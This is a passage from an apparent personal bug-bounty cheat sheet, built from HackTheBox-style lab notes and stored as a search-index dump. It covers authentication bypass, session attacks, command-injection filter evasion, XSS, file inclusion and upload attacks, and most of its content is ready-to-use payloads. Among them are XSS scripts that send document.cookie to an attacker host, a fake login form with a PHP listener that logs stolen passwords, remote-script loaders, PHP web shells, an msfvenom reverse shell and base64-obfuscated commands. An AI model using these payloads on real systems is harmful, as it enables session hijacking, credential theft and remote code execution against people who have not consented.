response.\"\n</code></pre></li> <li>Username Injection in Password Reset Request (check post parameters in http request)</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication/#authentication-bypasses","title":"Authentication Bypasses","text":"<ul> <li>Accessing the protected page directly</li> <li>go directly to hidden page /admin.ph </li> <li>catch the response in burp</li> <li>change status code from 302 to 200</li> <li>Manipulating HTTP Parameters to access protected pages</li> <li>Log in as regular user dirrcts to /admin.php?user_id=183</li> <li>guess or bruteforce id parameter Bash<pre><code>seq 1 1000 &gt; user_ids.txt\nffuf -w user_ids.txt -u http://STMIP:STMPO/admin.php?user_id=FUZZ -fr \"Could not load admin data.\"\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/broken-authentication/#session-attacks","title":"Session Attacks","text":"<ul> <li>Brute-Forcing cookies with insufficient entropy</li> <li>Capture multiple session tokens and compare for similarities</li> <li>Session cookie maybe long but most of it is fixed with only a small amount changing with each user</li> <li>Session cookies could also increment and not be random thus easy to enumerate passed/future session tokens</li> <li>Tokens maybe encoded values of the logon information</li> <li>Try decoding session tokens to see if no truly random Bash<pre><code>echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d\necho -n 'user=htb-stdnt;role=admin' | base64 # base64 encode\necho -n 'user=htb-stdnt;role=admin' | xxd -p # hex encode\n</code></pre></li> <li>Session Fixation</li> <li>Attacker obtains valid session identifier</li> <li>Attacker coerces victim to use this session identifier (social engineering)</li> <li>Victim authenticates to the vulnerable web application</li> <li>Attacker knows the victim's session identifier and can hijack their account</li> <li>Improper Session Timeout</li> <li>Sessions should expire after an appropriate time interval</li> <li>Session validity duration depends on the web application</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-hunting-process/","title":"Bug Bounty Reporting","text":""},{"location":"bug-bounty-guide/command-injections/","title":"Command Injections","text":"<p>PayloadAllTheThings Command Injection</p>"},{"location":"bug-bounty-guide/command-injections/#injection-operators","title":"Injection Operators","text":"Injection Operator Injection Character URL-Encoded Character Executed Command Semicolon ; %3b Both New Line \\n %0a Both Background &amp; %26 Both (second output generally shown first) Pipe %7c AND &amp;&amp; %26%26 Both (only if first succeeds) OR Sub-Shell `` %60%60 Both (Linux-only) Sub-Shell $() %24%28%29 Both (Linux-only)"},{"location":"bug-bounty-guide/command-injections/#linux","title":"Linux","text":""},{"location":"bug-bounty-guide/command-injections/#filtered-character-bypass","title":"Filtered Character Bypass","text":"Code Description <code>printenv</code> Can be used to view all environment variables Spaces <code>%09</code> Using tabs instead of spaces <code>${IFS}</code> Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) <code>{ls,-la}</code> Bash brace exspansion (commas will be replaced with spaces) Other Characters <code>${PATH:0:1}</code> Will be replaced with / <code>${LS_COLORS:10:1}</code> Will be replaced with ; <code>$(tr '!-}' '\"-~'&lt;&lt;&lt;[)</code> Shift character by one \"[\" (91) -&gt; \"\\\" (92)"},{"location":"bug-bounty-guide/command-injections/#blacklisted-command-bypass","title":"Blacklisted Command Bypass","text":"Code Description Character Insertion <code>' or \"</code> Total must be even <code>$@ or \\</code> Linux only Case Manipulation <code>$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")</code> Execute command regardless of cases <code>$(a=\"WhOaMi\";printf %s \"${a,,}\")</code> Another variation of the technique Reversed Commands <code>echo 'whoami' | rev</code> Reverse a string <code>$(rev&lt;&lt;&lt;'imaohw')</code> Execute reversed command Encoded Commands <code>echo -n 'cat /etc/passwd \\| grep 33' \\| base64</code> Encode a string with base64 <code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code> Execute b64 encoded string"},{"location":"bug-bounty-guide/command-injections/#windows","title":"Windows","text":""},{"location":"bug-bounty-guide/command-injections/#filtered-character-bypass_1","title":"Filtered Character Bypass","text":"Code Description <code>Get-ChildItem Env:</code> Can be used to view all environment variables - (PowerShell) Spaces <code>%09</code> Using tabs instead of spaces <code>%PROGRAMFILES:~10,-5%</code> Will be replaced with a space - (CMD) <code>$env:PROGRAMFILES[10]</code> Will be replaced with a space - (PowerShell) Other Characters <code>%HOMEPATH:~0,-17%</code> Will be replaced with \\ - (CMD) <code>$env:HOMEPATH[0]</code> Will be replaced with \\ - (PowerShell)"},{"location":"bug-bounty-guide/command-injections/#blacklisted-command-bypass_1","title":"Blacklisted Command Bypass","text":"Code Description Character Insertion <code>' or \"</code> Total must be even <code>^</code> Windows only (CMD) Case Manipulation <code>WhoAmi</code> Simply send the character with odd cases Reversed Commands <code>\"whoami\"[-1..-20] -join ''</code> Reverse a string <code>iex \"$('imaohw'[-1..-20] -join '')\"</code> Execute reversed command Encoded Commands <code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code> Encode a string with base64 <code>echo -n whoami \\| iconv -f utf-8 -t utf-16le \\| base64</code> Base 64 encode with linux to be decoded on windows <code>iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"</code> Execute b64 encoded string"},{"location":"bug-bounty-guide/command-injections/#evasion-tools","title":"Evasion Tools","text":""},{"location":"bug-bounty-guide/command-injections/#linux-bashfuscator","title":"Linux (Bashfuscator)","text":"<p>https://github.com/Bashfuscator/Bashfuscator</p> Bash<pre><code>git clone https://github.com/Bashfuscator/Bashfuscator\ncd Bashfuscator\npip3 install setuptools==65\npython3 setup.py install --user\ncd ./bashfuscator/bin/\n./bashfuscator -h ## show help screen\n./bashfuscator -c 'cat /etc/passwd' ## random choice obfuscation technique\n./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 ## short and simple obfuscated command\n</code></pre>"},{"location":"bug-bounty-guide/command-injections/#windows-dosfuscation","title":"Windows (DOSfuscation)","text":"<p>https://github.com/danielbohannon/Invoke-DOSfuscation</p> PowerShell<pre><code>git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git\ncd Invoke-DOSfuscation\nImport-Module .\\Invoke-DOSfuscation.psd1\nInvoke-DOSfuscation\nInvoke-DOSfuscation&gt; help ## show help screen\nInvoke-DOSfuscation&gt; SET COMMAND type C:\\Users\\htb-student\\Desktop\\flag.txt\nInvoke-DOSfuscation&gt; encoding\nInvoke-DOSfuscation\\Encoding&gt; 1 ## encode type 1 \n</code></pre> <p>Run windows powershell on linux with pwsh</p>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/","title":"Cross-Site Scripting (XSS)","text":""},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#types-of-xss","title":"Types of XSS","text":"<p>There are three main types of XSS vulnerabilities:</p> Type Description Stored (Persistent) XSS Occurs when user input is stored in a database and displayed (e.g., posts). Reflected (Non-Persistent) XSS Occurs when input is processed and shown without storage (e.g., search). DOM-based XSS Occurs when input is client-side processed and displayed (e.g., parameters)."},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#xss-discovery-methods","title":"XSS Discovery Methods","text":"<ul> <li>Nessus</li> <li>Burp Pro</li> <li>ZAP</li> <li>XSS Strike</li> <li>XSSer</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#xss-strike","title":"XSS Strike","text":"Bash<pre><code>git clone https://github.com/s0md3v/XSStrike.git\ncd XSStrike\npip install -r requirements.txt\npython xsstrike.py\npython xsstrike.py -u \"http://SERVER_IP:PORT/index.php?task=test\"\n</code></pre>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#xss-payloads","title":"XSS Payloads","text":"Code Description <code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code> windows.origin shows the URL of the stored XSS if IFrames being used <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> document.cookie shows the cookie of the current page/document <code>&lt;plaintext&gt;</code> Stops the rendoring of any HTML code that comes after <code>&lt;script&gt;print()&lt;/script&gt;</code> Pop up the browser print dialog <code>&lt;img src=\"\" onerror=alert(window.origin)&gt;</code> HTML-based XSS Payload. Use when script tag gets sanitised <code>&lt;script&gt;document.body.style.background = \"#141d2b\"&lt;/script&gt;</code> Change Background Color <code>&lt;script&gt;document.body.background = \"https://www.hackthebox.eu/images/logo-htb.svg\"&lt;/script&gt;</code> Change Background Image <code>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;</code> Change Website Title <code>&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = 'text'&lt;/script&gt;</code> Overwrite website's main body <code>&lt;script&gt;document.getElementById('urlform').remove();&lt;/script&gt;</code> Remove certain HTML element <code>&lt;script src=\"http://OUR_IP/script.js\"&gt;&lt;/script&gt;</code> Load remote script <code>&lt;script&gt;new Image().src='http://OUR_IP/index.php?c='+document.cookie&lt;/script&gt;</code> Send Cookie details to us <ul> <li>PayloadAllTheThings</li> <li>PayloadBox</li> </ul> <p>Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).</p>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#phishing","title":"Phishing","text":"<p>Initial step is to identify a working payload, ie:</p> JavaScript<pre><code>'&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n</code></pre> <p>Example of a basic HTML login form:</p> HTML<pre><code>&lt;h3&gt;Please login to continue&lt;/h3&gt;\n&lt;form action=http://OUR_IP&gt;\n    &lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;\n    &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;\n    &lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;\n&lt;/form&gt;\n</code></pre> <p>Which can be minified and put into JS:</p> JavaScript<pre><code>document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;&lt;/form&gt;');\n</code></pre> <p>To make the new form more likely to succeed, the original page HTML code should be removed:</p> <p>Original code example:</p> HTML<pre><code>&lt;form role=\"form\" action=\"index.php\" method=\"GET\" id='urlform'&gt;\n    &lt;input type=\"text\" placeholder=\"Image URL\" name=\"url\"&gt;\n&lt;/form&gt;\n</code></pre> <p>Removal code:</p> JavaScript<pre><code>document.getElementById('urlform').remove()\n</code></pre> <p>Adding a comment tag to the end of the payload will remove any remaining code after the exploit form:</p> HTML<pre><code>...PAYLOAD... &lt;!-- \n</code></pre> <p>Complete injection code:</p> JavaScript<pre><code>'&gt;&lt;script&gt;document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://PWNIP:PWNPO&gt;&lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;&lt;/form&gt;');document.getElementById('urlform').remove();&lt;/script&gt;&lt;!--\n</code></pre> <p>The payload should then be added to the URL parameter, encoded, and sent to the victim:</p> Text Only<pre><code>http://PWNIP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--\n</code></pre> <p>We can then use a basic PHP listener that will retrieve the creds and send the victim to the origin page, simulating a successful login:</p> <p>index.php</p> PHP<pre><code>&lt;?php\nif (isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {\n    $file = fopen(\"creds.txt\", \"a+\");\n    fputs($file, \"Username: {$_GET['username']} | Password: {$_GET['password']}\\n\");\n    header(\"Location: http://SERVER_IP/phishing/index.php\");\n    fclose($file);\n    exit();\n}\n?&gt;\n</code></pre> Bash<pre><code>mkdir /tmp/tmpserver\ncd /tmp/tmpserver\nvim index.php #write index.php to file here\nsudo php -S 0.0.0.0:8080\n</code></pre>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#blind-xss-detection","title":"Blind XSS detection","text":"<p>Occur with forms only accessible by certain user:</p> <ul> <li>Contact Forms</li> <li>Reviews</li> <li>User Details</li> <li>Support Tickets</li> <li>HTTP User-Agent header</li> </ul> <p>We can detect the presence of blind XSS by starting a netcat listener or php server and entering a script that calls to it:</p> HTML<pre><code>&lt;script src=\"http://OUR_IP/script.js\"&gt;&lt;/script&gt;\n</code></pre> <p>If the form has multiple fields we would detect which field is vulnerable like so:</p> HTML<pre><code>&lt;script src=http://OUR_IP/fullname&gt;&lt;/script&gt; #Used in the fullname field\n&lt;script src=http://OUR_IP/username&gt;&lt;/script&gt; #Used in the username field\n</code></pre> <p>Tip: Email maybe validated on the front-end and back-end, thus is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext.</p> <p>We made need to try multiple payload types, one at a time and appending each field name:</p> HTML<pre><code>&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\n'&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\n\"&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\njavascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://OUR_IP\\';document.body.appendChild(a)')\n&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//OUR_IP\");a.send();&lt;/script&gt;\n&lt;script&gt;$.getScript(\"http://OUR_IP\")&lt;/script&gt;\n</code></pre>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#session-hijaking","title":"Session hijaking","text":"<p>If we successfully find a blind XSS vulnerability we can attempt a session hijaking attack.</p> <p>Create two files:</p> <p>script.js</p> JavaScript<pre><code>new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie;\n</code></pre> <p>index.php</p> PHP<pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $list = explode(\";\", $_GET['c']);\n    foreach ($list as $key =&gt; $value) {\n        $cookie = urldecode($value);\n        $file = fopen(\"cookies.txt\", \"a+\");\n        fputs($file, \"Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\\n\");\n        fclose($file);\n    }\n}\n?&gt;\n</code></pre> <p>Start a php server:</p> Bash<pre><code>php -S 0.0.0.0:PWNPO\n</code></pre> <p>Use identified exploit to call script.js, ie:</p> JavaScript<pre><code>\"&gt;&lt;script src=http://PWNIP:PWNPO/script.js&gt;&lt;/script&gt;\n</code></pre>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#useful-commands","title":"Useful Commands","text":"Command Description <code>python xsstrike.py -u \"http://SERVER_IP:PORT/index.php?task=test\"</code> Run xsstrike on a url parameter <code>sudo nc -lvnp 8080</code> Start netcat listener <code>sudo php -S 0.0.0.0:8080</code> Start PHP server <p>Use cat to write to files:</p> Bash<pre><code>cat &lt;&lt; 'EOF' &gt; script.js\nnew Image().src='http://10.10.14.41:9001/index.php?c=' + document.cookie;\nEOF\n</code></pre>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#useful-links","title":"Useful Links","text":"<ul> <li>OWASP XSS</li> <li>XSS Filter Evasion Cheat Sheet</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion/","title":"File Inclusion","text":""},{"location":"bug-bounty-guide/file-inclusion/#local-file-inclusion","title":"Local File Inclusion","text":"<ul> <li>Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\\Windows\\boot.ini on Windows.</li> <li>If we find files on the web server (.php files for example), that return other status codes than 200 when fuzzing, these can still be viewed with LFI, so should not be ignored.</li> <li>If files get rendered during LFI we can encode them first, then decode to read the source code.</li> <li>If the web serrver adds a file extension like .php we do not need to add it when trying to LFI index.php, for example, to read the source code.</li> </ul> Command Description Basic LFI <code>/index.php?language=/etc/passwd</code> Basic LFI <code>/index.php?language=../../../../etc/passwd</code> LFI with path traversal <code>/index.php?language=/../../../etc/passwd</code> LFI with name prefix <code>/index.php?language=./languages/../../../../etc/passwd</code> LFI with approved path LFI Bypasses <code>/index.php?language=....//....//....//....//etc/passwd</code> Bypass basic path traversal filter <code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> Bypass filters with URL encoding <code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code> Bypass appended extension with path truncation (obsolete) <code>echo -n \"non_existing_directory/../../../etc/passwd/\" &amp;&amp; for i in {1..2048}; do echo -n \"./\"; done</code> <code>/index.php?language=../../../../etc/passwd%00</code> Bypass appended extension with null byte (obsolete) <code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code> Read PHP with base64 filter"},{"location":"bug-bounty-guide/file-inclusion/#second-order-attacks","title":"Second order attacks","text":"<p>Setting user names to <code>../../../../etc/passwd</code>, for example, could result in the LFI elsewhere the username is used.</p>"},{"location":"bug-bounty-guide/file-inclusion/#checking-php-configurations","title":"Checking PHP Configurations","text":"Bash<pre><code>curl \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini\" \n# 7.4 should be whatever php version is in use\n# /etc/php/X.Y/apache2/php.ini for Apache or /etc/php/X.Y/fpm/php.ini for nginx\necho 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include\n# check for value of allow_url_include (not enabled by default)\n# allow_url_include required to be on for use of various wrappers, including the data and input wrappers\necho 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect\n# check for except extension\npython3 -c 'import urllib.parse;print(urllib.parse.quote_plus(\"PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==\"))'\n# URL encoding for get requests\n</code></pre>"},{"location":"bug-bounty-guide/file-inclusion/#remote-code-execution","title":"Remote Code Execution","text":"Command Description PHP Wrappers <code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code> RCE with <code>data</code> wrapper (only available to use if the <code>allow_url_include</code> setting is enabled in the PHP configurations), base64 encoded <code>'&lt;?php system($_GET[\"cmd\"]); ?&gt;'</code>, prepend with <code>curl -s 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;</code> to preform with curl in command prompt <code>curl -s -X POST --data '&lt;?php system($_GET[\"cmd\"]); ?&gt;' \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id\"</code> RCE with input wrapper <code>curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id\"</code> RCE with expect wrapper RFI <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://127.0.0.1:80/index.php</code> Start by trying to include a local string, see if included as source code or executed as php etc NOTE Including the page itself (i.e. index.php) could cause a recursive loop DOS <code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code> Host web shell <code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code> Include remote PHP web shell, inspect received connection, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload <code>sudo python -m pyftpdlib -p 21</code> Hosting file through ftp instead <code>impacket-smbserver -smb2support share $(pwd)</code> Hosting file through SMB for windows servers, then use <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\\\&lt;OUR_IP&gt;\\share\\shell.php&amp;cmd=whoami</code> (more likely to work if we were on the same network) LFI + Upload <code>echo 'GIF8&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.gif</code> Create malicious image <code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code> RCE with malicious uploaded image <code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code> Create malicious zip archive 'as jpg' <code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code> RCE with malicious uploaded zip <code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code> Create malicious phar 'as jpg' <code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code> RCE with malicious uploaded phar LFI to RCE via PHPInfo Obsolete method Log Poisoning <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code> Read PHP session parameters <code>/index.php?language=session_poisoning</code> Test if session poisoning possible <code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code> Poison PHP session with web shell <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code> RCE through poisoned PHP session <code>/index.php?language=/var/log/apache2/access.log</code> Check if access logs available (error.log another common option), Once confirmed try changing user agent in burp and see if it is displayed <code>curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php\" -A '&lt;?php system($_GET[\"cmd\"]); ?&gt;'</code> Poison server log by setting user agent <code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code> RCE through poisoned PHP session <p>NOTE PHPSESSID is saved in /var/lib/php/sessions/ on Linux and in C:\\Windows\\Temp\\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.</p> <p>NOTE By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\\xampp\\apache\\logs\\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\\nginx\\log\\ on Windows. If not default could use an LFI Wordlist to fuzz for their locations.</p> <p>Tip Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.</p> <p>Tip The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.</p> <p>Other possibly readable logs: - /var/log/sshd.log - /var/log/mail - /var/log/vsftpd.log</p> <p>TIP Using curl for RFI</p> Bash<pre><code>curl -w \"\\n\" -s 'http://10.129.29.114/index.php?language=http://10.10.14.202:8000/webShell.php&amp;cmd=ls+/' | grep -v \"&lt;.*&gt;\"\n# curl flags:\n#   -w \"\\n\": Append newline\n#   -s: Silent mode\n# grep flags:\n#   -v: Invert match (exclude matching lines)\n#   &lt;.*&gt;: Regex for lines containing HTML tags\n</code></pre>"},{"location":"bug-bounty-guide/file-inclusion/#misc","title":"Misc","text":"<p>PHP filters - String Filters - Conversion Filters - Compression Filters - Encryption Filters</p> Command Description <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php</code> Fuzz for PHP files <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code> Fuzz page parameters <code>ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code> Fuzz LFI payloads <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code> Fuzz webroot path <code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287</code> Fuzz server configurations"},{"location":"bug-bounty-guide/file-inclusion/#lfi-wordlists","title":"LFI Wordlists","text":"<ul> <li>LFI-Jhaddix.txt</li> <li>Webroot path wordlist for Linux</li> <li>Webroot path wordlist for Windows</li> <li>Server configurations wordlist for Linux</li> <li>Server configurations wordlist for Windows</li> <li>Popular LFI parameters</li> <li>LFI wordlists</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion/#lfi-tools","title":"LFI tools","text":"<ul> <li>LFISuite</li> <li>LFiFreak</li> <li>liffy</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion/#file-inclusion-functions","title":"File Inclusion Functions","text":"Function Read Content Execute Remote URL PHP <code>include()/include_once()</code> Yes Yes Yes <code>require()/require_once()</code> Yes Yes No <code>file_get_contents()</code> Yes No Yes <code>fopen()/file()</code> Yes No No NodeJS <code>fs.readFile()</code> Yes No No <code>fs.sendFile()</code> Yes No No <code>res.render()</code> Yes Yes No Java <code>include</code> Yes No No <code>import</code> Yes Yes Yes .NET <code>@Html.Partial()</code> Yes No No <code>@Html.RemotePartial()</code> Yes No Yes <code>Response.WriteFile()</code> Yes No No <code>include</code> Yes Yes Yes"},{"location":"bug-bounty-guide/file-upload-attacks/","title":"File Upload Attacks","text":"<p>Tips:  - Find what language runs the web app by fuzzing the extention of the index page for common file types (/index.FUZZ). - \"Open image in new tab\" to see upload location (maybe encoded in the URL).</p> <p>Wappalyzer can also be used to detect what languages and othertechnologies are used.</p>"},{"location":"bug-bounty-guide/file-upload-attacks/#web-shells","title":"Web Shells","text":"Web Shell Description <code>&lt;?php echo file_get_contents('/etc/passwd'); ?&gt;</code> Basic PHP File Read <code>&lt;?php system('hostname'); ?&gt;</code> Basic PHP Command Execution <code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code> Basic PHP Web Shell <code>&lt;% eval request('cmd') %&gt;</code> Basic ASP Web Shell <code>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php</code> Generate PHP reverse shell PHP Web Shell PHP Web Shell PHP Reverse Shell PHP Reverse Shell Web/Reverse Shells List of Web Shells and Reverse Shells"},{"location":"bug-bounty-guide/file-upload-attacks/#bypasses","title":"Bypasses","text":"Command Description Client-Side Bypass (firefox shortcuts) <code>[CTRL+SHIFT+C]</code> Toggle Page Inspector and amend front end code (also inspect displayed files after upload to find location) or use burp to alter request <code>[CTRL+SHIFT+K]</code> Load browser console to review JS functions by typing their name in Blacklist Bypass (Can terst in burp intruder tab(may need to diable URL encoding)) <code>shell.phtml</code> Uncommon Extension <code>shell.pHp</code> Case Manipulation PHP Extensions List of PHP Extensions ASP Extensions List of ASP Extensions Web Extensions List of Web Extensions Whitelist Bypass (try fuzzing with web exstentions wordlist first to see what are accepted) <code>shell.jpg.php</code> Double Extension <code>shell.php.jpg</code> Reverse Double Extension (works when missconfigured webserver will execute because contains php and whitelist allows jpg (may need fuzzing php ext also (php7.jpg etc))) <code>%20, %0a, %00, %0d0a, /, .\\, ., \u2026</code> Character Injection - Before/After Extension Content/Type Bypass (Content-Type header check), fuzz contrent type in burp Content-Types List of All Content-Types File Signatures List of File Signatures/Magic Bytes (first bytes of a file indicate its MIME-type) <p>Note: A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.</p>"},{"location":"bug-bounty-guide/file-upload-attacks/#creating-character-injection-wordlist","title":"Creating Character Injection Wordlist","text":"Bash<pre><code>for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '\u2026' ':'; do\n    for ext in '.php' '.phps'; do # can add more php ext here\n        echo \"shell$char$ext.jpg\" &gt;&gt; wordlist.txt\n        echo \"shell$ext$char.jpg\" &gt;&gt; wordlist.txt\n        echo \"shell.jpg$char$ext\" &gt;&gt; wordlist.txt\n        echo \"shell.jpg$ext$char\" &gt;&gt; wordlist.txt\n    done\ndone\n</code></pre>"},{"location":"bug-bounty-guide/file-upload-attacks/#limiting-content-type-wordlist-example","title":"Limiting Content-Type wordlist example","text":"Bash<pre><code>wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt\ncat web-all-content-types.txt | grep 'image/' &gt; image-content-types.txt # method 1\ncat web-all-content-types.txt | grep 'image/' | xclip -se c # method 2\n</code></pre>"},{"location":"bug-bounty-guide/file-upload-attacks/#limited-uploads","title":"Limited Uploads","text":"<ul> <li>Secure filters not exploitable with above techniques</li> <li>Fuzz file extensions to try below techniques</li> </ul> Potential Attack File Types XSS HTML, JS, SVG, GIF XXE/SSRF XML, SVG, PDF, PPT, DOC DoS ZIP, JPG, PNG"},{"location":"bug-bounty-guide/file-upload-attacks/#xss","title":"XSS","text":"<ul> <li>Adding XSS payload to an image's metadata:</li> </ul> Bash<pre><code>exiftool -Comment=' \"&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' HTB.jpg\nexiftool HTB.jpg\n</code></pre> <ul> <li>Change the image's MIME-Type to 